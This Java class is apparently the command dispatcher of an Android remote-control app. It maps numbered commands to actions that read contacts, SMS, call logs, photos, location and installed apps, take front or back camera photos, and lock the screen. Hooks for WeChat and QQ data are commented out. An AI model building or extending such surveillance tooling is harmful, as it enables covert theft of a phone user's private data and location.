package com.lfish.control.action;

import java.util.HashMap;
import java.util.Map;
import android.annotation.TargetApi;
import android.os.Build;

import com.lfish.control.action.actiondomian.GetCallRecodeAction;
import com.lfish.control.action.actiondomian.GetContactAction;
import com.lfish.control.action.actiondomian.GetDeviceMsgAction;
import com.lfish.control.action.actiondomian.GetInstallAppsAction;
import com.lfish.control.action.actiondomian.GetLocationAction;
import com.lfish.control.action.actiondomian.GetPhotosAction;
import com.lfish.control.action.actiondomian.GetQQSdAction;
import com.lfish.control.action.actiondomian.GetSmsAction;
import com.lfish.control.action.actiondomian.GetWeChatSdAction;
import com.lfish.control.action.actiondomian.LockScreenAction;
import com.lfish.control.action.actiondomian.TackPhoto_BackAction;
import com.lfish.control.action.actiondomian.TackPhoto_FrontAction;
import com.lfish.control.action.cmddomian.GetCallRecodeCmd;
import com.lfish.control.action.cmddomian.GetContactsCmd;
import com.lfish.control.action.cmddomian.GetDeviceMsgCmd;
import com.lfish.control.action.cmddomian.GetInstallAppsCmd;
import com.lfish.control.action.cmddomian.GetLocationCmd;
import com.lfish.control.action.cmddomian.GetPhotosCmd;
import com.lfish.control.action.cmddomian.GetQQSdCmd;
import com.lfish.control.action.cmddomian.GetSmsCmd;
import com.lfish.control.action.cmddomian.GetWeChatSdCmd;
import com.lfish.control.action.cmddomian.LockScreenCmd;
import com.lfish.control.action.cmddomian.TackPhoto_BackCmd;
import com.lfish.control.action.cmddomian.TackPhoto_FrontCmd;

public class ActionFactory {
	
	private static ActionFactory actionFactory;
	private Map<Integer,Class> actionSet =new HashMap<Integer,Class>();
	private Map<Long,Thread> actionPoll =new HashMap<Long,Thread>();
	
	public static ActionFactory getInstance(){
		if(actionFactory==null){
			actionFactory  = new ActionFactory();
		}
		return actionFactory;
	}

	private ActionFactory() {
		super();
		// TODO Auto-generated constructor stub
	}
	
	public void init(){ 
		
		actionSet.put(1, GetDeviceMsgAction.class);
		actionSet.put(9, TackPhoto_FrontAction.class);
		actionSet.put(10, TackPhoto_BackAction.class);
		actionSet.put(5, GetLocationAction.class);
		actionSet.put(8, GetPhotosAction.class);
		actionSet.put(7, GetInstallAppsAction.class);
		actionSet.put(2, GetContactAction.class);
		actionSet.put(3, GetSmsAction.class);
		actionSet.put(6, GetCallRecodeAction.class);
//		actionSet.put(new GetWeChatSdCmd().getCmdNumber(), GetWeChatSdAction.class);
//		actionSet.put(new GetQQSdCmd().getCmdNumber(), GetQQSdAction.class);
		actionSet.put(11, LockScreenAction.class);
		
	}
	
	public Map<Integer,Class> getActionSet(){
		return actionSet;
	}
	
	@TargetApi(Build.VERSION_CODES.KITKAT)
	public BaseBeanAction getAction(int cmd){
		Class clazz = actionSet.get(cmd);
		if(clazz!=null){
			try {
				  Object newInstance = clazz.newInstance();
				  return (BaseBeanAction) newInstance;
			} catch (InstantiationException | IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return null;
	}
	
	public void runAction(BaseBeanAction baseBeanAction){
		Thread actionRunner = new Thread(baseBeanAction);
		actionRunner.getId();
		actionRunner.start();
		actionPoll.put(actionRunner.getId(), actionRunner);
	}
	
}
